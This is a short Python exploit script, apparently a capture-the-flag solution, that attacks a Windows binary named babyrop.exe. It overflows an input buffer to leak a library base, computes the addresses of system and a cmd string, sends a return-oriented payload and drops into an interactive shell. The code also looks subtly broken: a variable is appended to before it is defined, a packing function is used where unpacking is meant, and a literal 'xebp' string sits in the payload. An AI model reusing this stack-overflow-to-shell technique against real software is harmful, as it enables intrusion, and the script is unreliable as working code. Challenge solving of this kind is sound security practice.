from pwintools import *
from struct import *
#context.log_level = "debug"
p = process("./babyrop.exe")
p.recvuntil("name")
raw_input()
payload="A"*24
p.sendline(payload)
p.recvuntil("A"*24)
p.recvuntil("length")
raw_input()
lib_base=p32(p.recv(4))-0x0001d1af
system=0x73b22632-0x73ac0000+lib_base
cmd=0x73b03030-0x73ac0000+lib_base
payload1+="A"*66
payload1+="xebp"
payload1+=p32(system)
payload1+="xebp"
payload1+=p32(cmd)
p.sendline(str(len(payload1)+10))
p.sendline(payload1)
p.interactive()